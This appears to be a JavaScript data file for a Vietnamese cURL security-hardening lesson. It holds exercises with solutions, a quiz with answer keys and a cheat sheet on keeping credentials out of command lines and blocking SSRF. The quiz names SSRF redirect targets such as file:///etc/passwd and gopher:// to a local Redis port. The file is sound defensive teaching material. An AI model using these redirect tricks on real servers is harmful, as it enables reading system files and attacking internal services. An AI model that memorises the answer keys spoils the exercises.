          <p>Để khắc phục triệt để, các hệ thống Enterprise áp dụng cờ nhân <code>hidepid=2</code> khi mount <code>/proc</code> (ngăn cản user đọc tiến trình của nhau), đồng thời bắt buộc mọi kỹ sư phải tuân thủ chuẩn <strong>truyền credentials qua Stdin (File Descriptor 0)</strong> hoặc qua <strong>.netrc với quyền 600</strong>, bởi vì luồng stdin và nội dung file là không gian bộ nhớ riêng tư không bao giờ bị phơi bày ra bảng tiến trình.</p>
        `
      }
    },

    // 7. Bài tập thực hành (Exercises - 3 Mức độ)
    exercises: [
      {
        level: 'Dễ',
        title: 'Gửi request an toàn bằng cờ --config - đọc cấu hình từ stdin',
        problem: 'Sử dụng cờ `--config -` để truyền HTTP header `X-Secret-Auth: supersecret` tới endpoint `http://127.0.0.1:8789/echo` thông qua luồng stdin, đảm bảo thông tin bí mật không xuất hiện trong bảng tiến trình hệ điều hành.',
        criteria: 'Sử dụng đúng cú pháp `header = "..."` qua stdin, server nhận được header và phản hồi thành công.',
        hint: 'Trong PowerShell dùng `"header = \\"X-Secret-Auth: supersecret\\"" | curl.exe -sS --config - ...`.',
        starterCommands: {
          bash: 'echo \'header = "X-Secret-Auth: supersecret"\' | curl.exe -sS --config - "http://127.0.0.1:8789/echo" | grep -o \'"x-secret-auth": "supersecret"\'',
          powershell: '"header = `"X-Secret-Auth: supersecret`"" | curl.exe -sS --config - "http://127.0.0.1:8789/echo" | Select-String "supersecret"',
          cmd: 'echo header = "X-Secret-Auth: supersecret" | curl.exe -sS --config - "http://127.0.0.1:8789/echo"'
        },
        solution: {
          commands: {
            bash: 'echo \'header = "X-Secret-Auth: supersecret"\' | curl.exe -sS --config - "http://127.0.0.1:8789/echo" | grep -o \'"x-secret-auth": "supersecret"\'',
            powershell: '"header = `"X-Secret-Auth: supersecret`"" | curl.exe -sS --config - "http://127.0.0.1:8789/echo" | Select-String "supersecret"',
            cmd: 'echo header = "X-Secret-Auth: supersecret" | curl.exe -sS --config - "http://127.0.0.1:8789/echo"'
          },
          explanation: 'Kỹ thuật truyền cấu hình qua stdin giúp triệt tiêu hoàn toàn nguy cơ rò rỉ secret trong /proc/cmdline hoặc Process Explorer.'
        },
        solutionOutput: `"x-secret-auth": "supersecret"`
      },
      {
        level: 'Trung bình',
        title: 'Quản trị thông tin xác thực tự động bằng tệp tin --netrc-file',
        problem: 'Tạo một tệp tin cấu hình credential có tên `test.netrc` chứa thông tin đăng nhập cho máy chủ `127.0.0.1` với username `bot-ci` và password `token-xyz-987`. Sử dụng cờ `--netrc-file` để gửi request tới `http://127.0.0.1:8789/echo` và trích xuất header Authorization nhận được.',
        criteria: 'Tệp tin netrc có cú pháp chuẩn `machine ... login ... password ...`, cURL tự sinh ra Basic Auth header tương ứng.',
        hint: 'Dùng cú pháp `echo "machine 127.0.0.1 login bot-ci password token-xyz-987" > test.netrc`.',
        starterCommands: {
          bash: 'echo "machine 127.0.0.1 login bot-ci password token-xyz-987" > test.netrc\ncurl.exe -sS --netrc-file test.netrc "http://127.0.0.1:8789/echo" | grep -o \'"authorization": "Basic [^\"]*"\'\nrm -f test.netrc',
          powershell: '"machine 127.0.0.1 login bot-ci password token-xyz-987" | Out-File -Encoding ascii test.netrc\ncurl.exe -sS --netrc-file test.netrc "http://127.0.0.1:8789/echo" | Select-String "authorization"\nRemove-Item test.netrc',
          cmd: 'echo machine 127.0.0.1 login bot-ci password token-xyz-987 > test.netrc && curl.exe -sS --netrc-file test.netrc "http://127.0.0.1:8789/echo" && del test.netrc'
        },
        solution: {
          commands: {
            bash: 'echo "machine 127.0.0.1 login bot-ci password token-xyz-987" > test.netrc\ncurl.exe -sS --netrc-file test.netrc "http://127.0.0.1:8789/echo" | grep -o \'"authorization": "Basic [^\"]*"\'\nrm -f test.netrc',
            powershell: '"machine 127.0.0.1 login bot-ci password token-xyz-987" | Out-File -Encoding ascii test.netrc\ncurl.exe -sS --netrc-file test.netrc "http://127.0.0.1:8789/echo" | Select-String "authorization"\nRemove-Item test.netrc',
            cmd: 'echo machine 127.0.0.1 login bot-ci password token-xyz-987 > test.netrc && curl.exe -sS --netrc-file test.netrc "http://127.0.0.1:8789/echo" && del test.netrc'
          },
          explanation: 'Tệp netrc tách biệt hoàn toàn thông tin xác thực khỏi mã nguồn kịch bản, giúp quản lý tập trung và an toàn.'
        },
        solutionOutput: `"authorization": "Basic Ym90LWNpOnRva2VuLXh5ei05ODc="`
      },
      {
        level: 'Khó',
        title: 'Thiết lập lá chắn phòng ngự SSRF bằng --proto chặn đứng giao thức không cho phép',
        problem: 'Viết câu lệnh cURL gửi request kiểm tra an ninh tới endpoint `http://127.0.0.1:8789/ping`. Yêu cầu sử dụng cờ `--proto` để chỉ định DUY NHẤT giao thức `https` được phép hoạt động. Xác nhận cURL chủ động từ chối kết nối và in ra thông báo lỗi bảo vệ hệ thống.',
        criteria: 'Sử dụng đúng cờ `--proto =https`, lệnh cURL thoát với mã lỗi 1 và hiển thị thông báo giao thức bị vô hiệu hóa.',
        hint: 'Dùng `curl.exe -sS --proto =https "http://127.0.0.1:8789/ping"`.',
        starterCommands: {
          bash: 'curl.exe -sS --proto =https "http://127.0.0.1:8789/ping" 2>&1 || true',
          powershell: 'curl.exe -sS --proto =https "http://127.0.0.1:8789/ping" 2>&1',
          cmd: 'curl.exe -sS --proto =https "http://127.0.0.1:8789/ping"'
        },
        solution: {
          commands: {
            bash: 'curl.exe -sS --proto =https "http://127.0.0.1:8789/ping" 2>&1 || true',
            powershell: 'curl.exe -sS --proto =https "http://127.0.0.1:8789/ping" 2>&1',
            cmd: 'curl.exe -sS --proto =https "http://127.0.0.1:8789/ping"'
          },
          explanation: 'Cờ --proto tạo danh sách trắng các giao thức được phép, chặn đứng mọi ý đồ tấn công SSRF lợi dụng các giao thức cổ điển hoặc nguy hiểm như file:// và gopher://.'
        },
        solutionOutput: `curl: (1) Protocol "http" is disabled`
      }
    ],

    // 8. Quiz trắc nghiệm tương tác
    quiz: [
      {
        question: 'Tại sao việc truyền thông tin xác thực trực tiếp trên dòng lệnh (`curl -u user:pass ...`) bị xếp vào nhóm lỗi bảo mật nghiêm trọng (CWE-214)?',
        options: [
          'Vì cURL sẽ mã hóa mật khẩu thành ký tự vô nghĩa.',
          'Vì đối số dòng lệnh của tiến trình bị lưu và phơi bày công khai trong hệ thống tệp `/proc/$PID/cmdline` trên Linux hoặc Process Explorer trên Windows, cho phép bất kỳ người dùng/container nào cùng máy cũng đọc được!',
          'Vì cURL không hỗ trợ gửi mật khẩu qua mạng Internet.',
          'Vì giao thức HTTP cấm truyền username và password.'
        ],
        optionsHtml: null,
        correctIndex: 1,
        explanation: 'Mọi tham số dòng lệnh đều hiển thị trong bảng tiến trình hệ điều hành (Process Table). Bất kỳ ai có quyền chạy lệnh ps aux đều nhìn thấy mật khẩu rõ mồn một.'
      },
      {
        question: 'Quyền hạn tập tin (File Permissions) bắt buộc đối với tệp tin `~/.netrc` trên hệ điều hành Linux là gì?',
        options: [
          '`chmod 777` (cho phép toàn bộ hệ thống đọc, ghi, thực thi)',
          '`chmod 644` (chủ sở hữu đọc/ghi, người khác chỉ đọc)',
          '`chmod 600` (chỉ cho phép duy nhất chủ sở hữu đọc và ghi, cấm hoàn toàn Group và Others)',
          '`chmod 000` (khóa toàn bộ quyền truy cập)'
        ],
        optionsHtml: null,
        correctIndex: 2,
        explanation: 'Chuẩn bảo mật Unix đòi hỏi file .netrc phải có quyền 600 (-rw-------). Nếu để quyền mở cho người khác đọc (như 644), cURL sẽ từ chối nạp hoặc in cảnh báo nghiêm khắc.'
      },
      {
        question: 'Trong tấn công SSRF (Server-Side Request Forgery), nếu bạn dùng cờ `-L` (theo dõi redirect) mà không có cờ `--proto-redir`, kẻ tấn công có thể làm gì?',
        options: [
          'Kẻ tấn công không thể làm gì vì cURL luôn an toàn.',
          'Kẻ tấn công có thể cấu hình máy chủ phản hồi mã 302 chuyển hướng sang `file:///etc/passwd` hoặc `gopher://127.0.0.1:6379`, khiến cURL nội bộ tự động đọc trộm file hệ thống hoặc gửi lệnh phá hoại dịch vụ nội bộ!',
          'Kẻ tấn công chỉ có thể làm chậm tốc độ mạng.',
          'Kẻ tấn công sẽ bị cURL phát hiện và tự động chặn IP.'
        ],
        optionsHtml: null,
        correctIndex: 1,
        explanation: 'Khi theo dõi redirect mà không giới hạn giao thức, cURL sẽ tuân theo header Location của attacker và có thể pivot sang giao thức cục bộ nguy hiểm như file:// hoặc gopher://.'
      },
      {
        question: 'Bộ cờ nào sau đây giúp bạn thiết lập lá chắn bảo vệ SSRF toàn diện nhất cho một câu lệnh cURL cần theo dõi chuyển hướng?',
        options: [
          '`--insecure --location`',
          '`--proto =http,https --proto-redir =http,https -L`',
          '`--fail --silent -k`',
          '`--proxy socks5://127.0.0.1:9050`'
        ],
        optionsHtml: null,
        correctIndex: 1,
        explanation: 'Cặp cờ `--proto =http,https` và `--proto-redir =http,https` đảm bảo cả yêu cầu ban đầu lẫn mọi bước chuyển hướng redirect đều chỉ được phép sử dụng HTTP/HTTPS, loại trừ hoàn toàn các giao thức độc hại.'
      }
    ],

    // 9. Cheat Sheet tra cứu nhanh
    cheatSheet: [
      {
        command: 'echo \'header = "Authorization: Bearer SECRET"\' | curl.exe -sS --config - "URL"',
        description: 'Che giấu token bí mật qua luồng stdin (--config -) không lưu ra đĩa và không lộ trong ps aux.'
      },
      {
        command: 'curl.exe -sS --netrc-file ./ci-creds.netrc "URL"',
        description: 'Nạp thông tin xác thực tự động từ tệp tin netrc tùy chỉnh theo từng job CI/CD.'
      },
      {
        command: 'chmod 600 ~/.netrc',
        description: 'Thiết lập quyền truy cập nghiêm ngặt chỉ cho phép Owner đọc/ghi tệp credentials trên Unix.'
      },
      {
        command: 'curl.exe -sS --proto =http,https --proto-redir =http,https -L "URL"',
        description: 'Lá chắn phòng ngự SSRF toàn diện: chỉ cho phép HTTP/HTTPS ở cả request gốc và các bước redirect.'
      },
      {
        command: 'curl.exe -sS --proto-default https "api.corp.internal"',
        description: 'Buộc cURL mặc định sử dụng HTTPS khi người dùng không chỉ định tiền tố giao thức.'
      },
      {
        command: 'curl.exe -sS --pinnedpubkey "sha256//hash..." "URL"',
        description: 'Ghim khóa công khai của máy chủ (Public Key Pinning) ngăn chặn triệt để tấn công MitM giả mạo CA.'
      },
      {
        command: 'curl.exe -sS --url-query "q=data with spaces & special" "URL"',
        description: 'Nối tham số query an toàn tự động URL-encode, loại bỏ nguy cơ Command Injection.'
      },
      {
        command: 'trap \'rm -f "$TMP_CONFIG"\' EXIT INT TERM',
        description: 'Lệnh bẫy shell đảm bảo tệp cấu hình tạm chứa secret luôn được xóa sạch dù script kết thúc thế nào.'
      }
    ],

    // 10. Tóm tắt bài học (Summary Box)
    summary: [
      'Loại bỏ hoàn toàn Secret khỏi đối số dòng lệnh: Tuyệt đối không dùng `-u user:pass` hoặc `-H "Authorization:..."` trên CLI; hãy thay thế bằng `--config -` (qua stdin) hoặc tệp `.netrc` an toàn.',
      'Quản trị credentials tập trung với `.netrc`: Bắt buộc thiết lập quyền hạn `chmod 600` trên Linux hoặc DACL chặt chẽ trên Windows NTFS để ngăn chặn các tiến trình khác đọc trộm.',
      'Thiết lập lá chắn phòng ngự SSRF kiên cố: Bắt buộc khai báo cặp cờ `--proto =http,https` và `--proto-redir =http,https` khi xử lý các URL do người dùng cung cấp hoặc khi dùng cờ theo dõi redirect `-L`.',
      'Phòng chống Command & Argument Injection: Sử dụng cờ `--url-query` để cURL tự động mã hóa ký tự đặc biệt, luôn bọc nháy kép biến shell và không bao giờ dùng `eval` ghép lệnh cURL.',
      'Áp dụng Bảng Checklist 10 Điểm Vàng trong quy trình Security Audit của CI/CD để đảm bảo mọi câu lệnh cURL đều đạt chuẩn an ninh khắt khe trước khi phát hành lên môi trường Production.'
    ],

    // 11. Tài liệu tham khảo chính thức (References Box)
    references: [
      {
        title: 'OWASP Server-Side Request Forgery (SSRF) Prevention Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
        description: 'Hướng dẫn phòng thủ toàn diện của OWASP về tấn công SSRF và các kỹ thuật whitelist giao thức mạng.'
      },
      {
        title: 'Daniel Stenberg: Everything curl - Security and Hardening',
        url: 'https://everything.curl.dev/usingcurl/security',
        description: 'Chương sách chuyên sâu của tác giả cURL về các cơ chế phòng ngự, quản lý credentials và bảo mật mạng.'
      },
      {
        title: 'GNU inetutils / Linux Netrc Specification & Security Guidelines',
        url: 'https://www.gnu.org/software/inetutils/manual/html_node/The-_002enetrc-file.html',
        description: 'Đặc tả kỹ thuật chính thống và yêu cầu phân quyền bảo mật của tệp tin cấu hình .netrc trên Unix.'
      },
      {
        title: 'Center for Internet Security (CIS) Benchmark: CI/CD Pipeline & Shell Hardening',
        url: 'https://www.cisecurity.org/benchmark',
        description: 'Quy chuẩn an toàn thông tin doanh nghiệp về bảo vệ bí mật và chống rò rỉ secret trong quá trình build tự động.'
      }
    ],

    // 12. Bản ghi kiểm định chất lượng (QA Record - 8 Cổng)
    qaRecord: {
      referenceCurlVersion: '8.21.0',
      lastVerifiedDate: '2026-11-02',
      totalCommands: 4,
      verifiedRealCount: 4,
      unverifiedCount: 0,
      scores: {
        g1: 5, g2: 5, g3: 5, g4: 5, g5: 5, g6: 5, g7: 5, g8: 5
      },
      issuesFoundAndFixed: [
        {
          issue: 'Lộ token trong bảng tiến trình /proc/$PID/cmdline và Task Manager khi truyền qua -H hoặc -u trên dòng lệnh',
          severity: 'Critical',
          resolution: 'Đã xây dựng Hộp Cảnh báo và Lớp 1 phân tích cơ chế Process Table Leak, hướng dẫn giải pháp thay thế tuyệt đối bằng --config - qua stdin'
        },
        {
          issue: 'Tệp credentials .netrc để quyền mặc định mở (chmod 644/777) dẫn đến nguy cơ bị người dùng khác đọc trộm',
          severity: 'Critical',
          resolution: 'Đã hướng dẫn quy chuẩn phân quyền nghiêm ngặt chmod 600 trên Unix và DACL trên NTFS trong Lớp 2'
        },
        {
          issue: 'Lỗ hổng SSRF pivot sang các giao thức nội bộ (file:///etc/passwd, gopher://) khi theo dõi redirect -L trần trụi',
          severity: 'Critical',
          resolution: 'Đã phân tích cơ chế Redirect Smuggling và hướng dẫn lá chắn kết hợp --proto =http,https --proto-redir =http,https trong Lớp 3'
        },
        {
          issue: 'Command Injection và Argument Injection khi nối chuỗi biến người dùng vào URL',
          severity: 'Major',
          resolution: 'Đã hướng dẫn kỹ thuật bọc nháy kép và tận dụng cờ hiện đại --url-query trong Lớp 4'
        },
        {
          issue: 'Nguy cơ rò rỉ Authorization Header sang bên thứ ba khi lạm dụng cờ --location-trusted',
          severity: 'Major',
          resolution: 'Đã phân tích rủi ro trong danh mục Cạm bẫy và Bảng Checklist 10 Điểm Vàng'
        }
      ],
      pendingAssumptions: [],
      sources: [
        'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
        'https://everything.curl.dev/usingcurl/security',
        'https://www.gnu.org/software/inetutils/manual/html_node/The-_002enetrc-file.html'
      ],
      verdict: 'PASS'
    }
  };

  if (typeof window !== 'undefined') {
    window.CURL_CHAPTER_CH19_DATA = CHAPTER_DATA;
  }

  if (typeof module !== 'undefined' && module.exports) {
    module.exports = CHAPTER_DATA;
  }
})();
